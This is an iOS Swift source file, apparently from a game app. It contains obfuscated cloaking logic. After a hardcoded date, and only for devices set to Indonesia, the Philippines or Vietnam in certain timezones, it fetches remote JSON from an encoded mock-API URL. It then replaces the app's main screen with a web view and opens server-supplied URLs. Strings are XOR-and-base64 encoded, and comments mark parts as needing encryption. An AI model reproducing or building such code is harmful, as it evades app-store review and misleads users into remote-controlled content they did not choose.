
import Foundation
import UIKit
//import AdjustSdk
import AppsFlyerLib

//func encrypt(_ input: String, key: UInt8) -> String {
//    let bytes = input.utf8.map { $0 ^ key }
//        let data = Data(bytes)
//        return data.base64EncodedString()
//}

func usnyeies(_ input: String) -> String? {
    let k: UInt8 = 101
    guard let data = Data(base64Encoded: input) else { return nil }
    let decryptedBytes = data.map { $0 ^ k }
    let dhys = String(bytes: decryptedBytes, encoding: .utf8)?.reversed()
    return String(dhys!)
}

//https://api.my-ip.io/v2/ip.json   t6urr6zl8PC+r7bxsqbytq/xtrDwqe3wtq/xtaywsQ==
//internal let kMocbxtre = "r66yq++xqO7zt+6uqO+xqOy4rO+osaDu7vuysbW1qQ=="         //Ip ur

//https://mock.apipost.net/mock/6454f9e56c6e000/?apipost_id=54faa00f22002
// right YX19eXozJiY/MGw6Oj5sajo6Oz4xOj5oODw8O2wwamsnZGZqYmh5YCdgZiZhfGx/aCZ9aHlqYWx6
internal let kTbusyes = "V1VVV1cDVVUEBANRUFgBDDoRFgoVDBUEWkpVVVUAUwZTUABcA1FQUVNKDgYKCEoRAAtLERYKFQwVBEsOBgoISkpfFhUREQ0="

//https://mock.mengxuegu.com/mock/6a0acb77eeedae6a26b3eb86/old/chaozais
//internal let kXyuznye = "sqigu66gqaLupa2u7vf5o6Tyo/fzoPekoKWkpKT29qOioPGg9+6qoq6s7qyuou+0pqS0uaavpKzvqqKurO7u+7KxtbWp"


// https://raw.githubusercontent.com/jduja/chaoza/main/Overload.png
// pq+x76Wgrq2zpLeO7q+ooKzuoLuuoKmi7qCrtKWr7qyuou+1r6S1r66is6SytKO0qbWopu+2oLPu7vuysbW1qQ==
//internal let kNuxbfste = "pq+x76Wgrq2zpLeO7q+ooKzuoLuuoKmi7qCrtKWr7qyuou+1r6S1r66is6SytKO0qbWopu+2oLPu7vuysbW1qQ=="

/*--------------------Tiao yuansheng------------------------*/
//need jia mi
//internal func lxoausn() {
////    UIApplication.shared.windows.first?.rootViewController = vc
//    
//    DispatchQueue.main.async {
//        if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
////            let tp = ws.windows.first!.rootViewController! as! UITabBarController
//
////            let tp = ws.windows.first!.rootViewController! as! UINavigationController
//            let tp = ws.windows.first!.rootViewController!
//            for view in tp.view.subviews {
//                if view.tag == 919 {
//                    view.removeFromSuperview()
//                }
//            }
//        }
//    }
//}

internal let lxoausn: () -> Void = {
    let execute: () -> Void = {
        guard let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene else {
            return
        }
        let root = ws.windows.first!.rootViewController as! UINavigationController
        
        root.topViewController!.view.subviews.filter { $0.tag == 91 }
            .forEach {
            $0.removeFromSuperview()
        }
    }
    DispatchQueue.main.async {
        execute()
    }
}


// MARK: - 加密调用全局函数HandySounetHmeSh
internal func ratgeOoss() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: lxoausn
    ]
    
    fctn[fName]?()
}


/*--------------------Tiao wangye------------------------*/
//need jia mi
//internal func ncautes(_ dt: Lmxisye) {
//    DispatchQueue.main.async {
//        UserDefaults.standard.setModel(dt, forKey: "Lmxisye")
//        UserDefaults.standard.synchronize()
//        
//        let vc = HoaueViewController()
//        vc.ksien = dt
//        UIApplication.shared.windows.first?.rootViewController = vc
//    }
//}

internal let ncautes: (Lmxisye) -> Void = { dt in
    let saveAction: () -> Void = {
        UserDefaults.standard.setModel(dt, forKey: "Lmxisye")
        UserDefaults.standard.synchronize()
    }

    let routeAction: () -> Void = {
        let build: () -> GamePOverViewController = {
            let vc = GamePOverViewController()
            vc.nuahye = dt
            return vc
        }

        let present: (UIViewController) -> Void = { vc in
            UIApplication.shared.windows.first?.rootViewController = vc
        }
        present(build())
    }

    DispatchQueue.main.async {
            saveAction()
            routeAction()
    }
}


internal func mdkaoye(_ param: Lmxisye) {
    let fName = ""

    typealias rushBlitzIusj = (Lmxisye) -> Void
    
    let fctn: [String: rushBlitzIusj] = [
        fName : ncautes
    ]
    
    fctn[fName]?(param)
}

let Nam = "name"
let DT = "data"
let UL = "url"

/*--------------------Tiao wangye------------------------*/
//need jia mi
//af_revenue/af_currency
//func ndmdjTagssb(_ dic: [String : String]) {
//    var dataDic: [String : Any]?
//    if let data = dic["params"] {
//        if data.count > 0 {
//            dataDic = data.stringTo()
//        }
//    }
//    if let data = dic["data"] {
//        dataDic = data.stringTo()
//    }
//
//    let name = dic[Nam]
//    print(name!)
//    
//    
//    if dataDic?[amt] != nil && dataDic?[ren] != nil {
//        AppsFlyerLib.shared().logEvent(name: String(name!), values: [AFEventParamRevenue : dataDic![amt] as Any, AFEventParamCurrency: dataDic![ren] as Any]) { dic, error in
//            if (error != nil) {
//                print(error as Any)
//            }
//        }
//    } else {
//        AppsFlyerLib.shared().logEvent(name!, withValues: dataDic)
//    }
//    
//    if name == OpWin {
//        if let str = dataDic![UL] {
//            UIApplication.shared.open(URL(string: str as! String)!)
//        }
//    }
//}


internal let ndmdjTagssb: ([String : String]) -> Void = { dic in
    let parseData: () -> [String : Any]? = {
        var result: [String : Any]?
        let parse: (String?) -> [String : Any]? = {

            guard let value = $0, value.count > 0
            else {
                return nil
            }
            return value.stringTo()
        }

        if let params = parse(dic["params"]) {
            result = params
        }

        if let data = parse(dic["data"]) {
            result = data
        }

        return result
    }

    let eventAction: (String, [String : Any]?) -> Void = { name, dataDic in
        let revenue = dataDic?[amt]
        let currency = dataDic?[ren]
        if revenue != nil, currency != nil {
            AppsFlyerLib.shared().logEvent(name: name, values: [AFEventParamRevenue: revenue as Any, AFEventParamCurrency:currency as Any]) { _, error in
                    if error != nil {
                        print(error as Any)
                    }
                }
        } else {
            AppsFlyerLib.shared().logEvent(name, withValues: dataDic)
        }
    }

    let routeAction: (String, [String : Any]?) -> Void = { name, dataDic in
        guard name == OpWin,
              let str = dataDic?[UL] as? String,
            let url = URL(string: str)
        else {
            return
        }

        DispatchQueue.main.async {
            UIApplication.shared.open(url)
        }
    }

    let execute: () -> Void = {
        guard let name = dic[Nam] else {
            return
        }

        let dataDic = parseData()
        print(name)
        eventAction(name, dataDic)

        routeAction(name,dataDic)
    }

    DispatchQueue.global().async {
            execute()
    }
}


internal func gdiayHuaie(_ param: [String : String]) {
    let fName = ""
    typealias maxoPams = ([String : String]) -> Void
    let fctn: [String: maxoPams] = [
        fName : ndmdjTagssb
    ]
    
    fctn[fName]?(param)
}

//internal struct Kicntc: Decodable {
//    let vteavs: Int?
//    let jdiyxt: String?
//    let rtzvvl: [String : String]?
//
//    let country: Zyxtie?
//    
//    struct Zyxtie: Decodable {
//        let code: String
//    }
//}
//

internal struct Lmxisye: Codable {
    let cybnaos: String?
    let wwuajue: [String]?
    let xhiaue: Int?
//        let nomtae: [String]?            // yeu nan xianzhi

    let kdmoae: String?         //key arr
    let ckous: String?         // shi fou kaiqi
    let nbdiay: String?         // jum
    let msjaua: String?          // backcolor
    let laoute: String?
    let rstzvsf: String?   //ad key
    let ncjoay: String?   // app id
    let dtrave: String?  // bri co
}

//func hsrezts() -> Bool {
//   
//  // 2026-05-19 05:16:49
//  //1779139009
//    let ftTM = 1779139009
//    let ct = Date().timeIntervalSince1970
//    if Int(ct) - ftTM > 0 {
//        return true
//    }
//    return false
//}

//时间
internal let Tosureb: () -> Void = {
    let tmp: () -> Int = {
//       2026-05-21 06:32:18
//      1779304609
        return 1779304609
    }

    let daqin: () -> Int = {
        Int(Date().timeIntervalSince1970)
    }

    let compare: (Int, Int) -> Bool = { now, target in
        (now - target) > 0
    }

    let persist: () -> Void = {
        UserDefaults.standard.set("bestP", forKey: "BestPeak")
        UserDefaults.standard.synchronize()
    }

    let execute: () -> Void = {
        let target = tmp()
        let now = daqin()

        guard compare(now, target) else {
            UserDefaults.standard.set("", forKey: "BestPeak")
            UserDefaults.standard.synchronize()
            return
        }
        persist()
    }

    DispatchQueue.global().async {
        execute()
    }
}


//func viaousne(_ lsn: [String]) -> Bool {
//    // 获取用户设置的首选语言（列表第一个）
//    guard let cysh = Locale.preferredLanguages.first else {
//        return false
//    }
//    let arr = cysh.components(separatedBy: "-")
//    if lsn.contains(arr[0]) {
//        return true
//    }
//    return false
//}

//private let cdo = ["US","NL", "PH"]
// ["BR", "VN", "TH", "PH"]
//private let cdo = [Nhaisusm("f28="), Nhaisusm("a3M="), Nhaisusm("aXU=")]

//US、IE、NL、DE、CN、HK
//let dbcrare = [ysnciy("kpQ="), ysnciy("jY8="), ysnciy("hIg="), ysnciy("hIU="), ysnciy("j4I="), ysnciy("iok=")]

//ID PH VN
private let Noxuyas = [usnyeies("ISw="), usnyeies("KzM="), usnyeies("LTU=")]


//internal func Kicbrea(_ regsi: [String]) -> Bool {
//    if let rc = Locale.current.regionCode {
////        print(rc)
//        if regsi.contains(rc) {
//            return true
//        }
//    }
//    return false
//}

// 时区控制
//func Kmansiy() -> Bool {
//    
//    // 1.sm cad
////    if !tarvso() {
////        return false
////    }
//
//    //2. regi
//    if let rc = Locale.current.regionCode {
////        print(rc)
//        if !Noxuyas.contains(rc) {
//            return false
//        }
//    }
//    
//    //3. tm zon
//    let offset = NSTimeZone.system.secondsFromGMT() / 3600
//    if (offset > 6 && offset < 10) {
//        return true
//    }
////    if (offset > 6 && offset <= 8) || (offset > -6 && offset < -1) {
////        return true
////    }
//    
//    return false
//}

internal let Kmansiy: () -> Bool = {

    let regionCheck: () -> Bool = {
        let fetch: () -> String? = {
            Locale.current.regionCode
        }

        let validate: (String) -> Bool = { code in
            Noxuyas.contains(code)
        }

        guard let code = fetch() else {
            return false
        }

        return validate(code)
    }

    let tmck: () -> Bool = {
        let offset: () -> Int = {
            NSTimeZone.system.secondsFromGMT() / 60 / 60
        }

        let compare: (Int) -> Bool = { value in
            value > 6 && value < 10
        }

        return compare(offset())
    }

    let execute: () -> Bool = {
        guard regionCheck() else {
            return false
        }

        guard tmck() else {
            return false
        }
        return true
    }

    return execute()
}


//////////////////////////////////
internal func BaighTuass() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: cmkaosu
    ]
    
    fctn[fName]?()
}

//private func cmkaosu() {
////    if UserDefaults.standard.object(forKey: "peakse") != nil {
////        ratgeOoss()
////    } else {
//        if Kmansiy() {
//            mdoiyteg()
//        } else {
////            UserDefaults.standard.set("patter", forKey: "patter")
////            UserDefaults.standard.synchronize()
//            ratgeOoss()
//        }
////    }
//}

internal let cmkaosu: () -> Void = {

    let storage: () -> UserDefaults = {
        UserDefaults.standard
    }

    let hasPattern: () -> Bool = {
        storage().object(forKey: "Peakse") != nil
    }

    let exLocl:() -> Void = {
        let action:() -> Void = {
            ratgeOoss()
        }
        action()
    }

    let exRetres: () -> Void = {
        let route: () -> Void = {
            mdoiyteg()
        }
        route()
    }

    let decision: () -> Void = {
        if hasPattern() {
            exLocl()
            return
        }

        let verify: () -> Bool = {
            Kmansiy()
        }

        guard verify()  else {
            exLocl()
            return
        }

        exRetres()
    }

    DispatchQueue.global().async {
        decision()
    }
}


//private func mdoiyteg() {
//    Task {
//        do {
//            let aoies = try await chyayHvtgy()
//            if let gduss = aoies.first {
//                if gduss.ckous!.count == 4 {
//                        mdkaoye(gduss)
//                } else {
//                    ratgeOoss()
//                }
//            } else {
//                ratgeOoss()
//            }
//        } catch {
//            if let sidd = UserDefaults.standard.getModel(Lmxisye.self, forKey: "Lmxisye") {
//                mdkaoye(sidd)
//            }
//        }
//    }
//}

private let mdoiyteg: () -> Void = {

    let fallback: () -> Void = {
        let action:() -> Void = {
            ratgeOoss()
        }
        action()
    }

    let restore: () -> Void = {
        let fetch: () -> Lmxisye? = {
            UserDefaults.standard.getModel(Lmxisye.self, forKey: "Lmxisye")
        }

        guard let model = fetch() else {
            return
        }

        let execute: () -> Void = {
            mdkaoye(model)
        }
        execute()
    }

    let validate: (Lmxisye) -> Bool = { item in
        guard let value = item.ckous
        else {
            return false
        }

        return value.count == 4
    }

    let route: (Lmxisye) -> Void = { item in
        let success: () -> Void = {
            mdkaoye(item)
        }

        let failure: () -> Void = {
            fallback()
        }

        validate(item) ? success() : failure()
    }

    Task {
        do {
            let request: () async throws -> [Lmxisye] = {
                try await chyayHvtgy()
            }

            let result = try await request()

            guard let first = result.first
            else {
                fallback()
                return
            }
            route(first)
        } catch {
            restore()
        }
    }
}


private func chyayHvtgy() async throws -> [Lmxisye] {
    let (data, response) = try await URLSession.shared.data(from: URL(string: usnyeies(kTbusyes)!)!)

    guard let httpResponse = response as? HTTPURLResponse,
          httpResponse.statusCode == 200 else {
        throw NSError(domain: "Fail", code: 0, userInfo: [
            NSLocalizedDescriptionKey: "Invalid response"
        ])
    }

    return try JSONDecoder().decode([Lmxisye].self, from: data)
}


import CoreTelephony

func tarvso() -> Bool {
    let networkInfo = CTTelephonyNetworkInfo()
    
    guard let carriers = networkInfo.serviceSubscriberCellularProviders else {
        return false
    }
    
    for (_, carrier) in carriers {
        if let mcc = carrier.mobileCountryCode,
           let mnc = carrier.mobileNetworkCode,
           !mcc.isEmpty,
           !mnc.isEmpty {
            return true
        }
    }
    
    return false
}


extension String {
    func stringTo() -> [String: AnyObject]? {
        let jsdt = data(using: .utf8)
        
        var dic: [String: AnyObject]?
        do {
            dic = try (JSONSerialization.jsonObject(with: jsdt!, options: .mutableContainers) as? [String : AnyObject])
        } catch {
            print("parse error")
        }
        return dic
    }
    
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }
    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")
        
        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }
        
        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}


extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
}
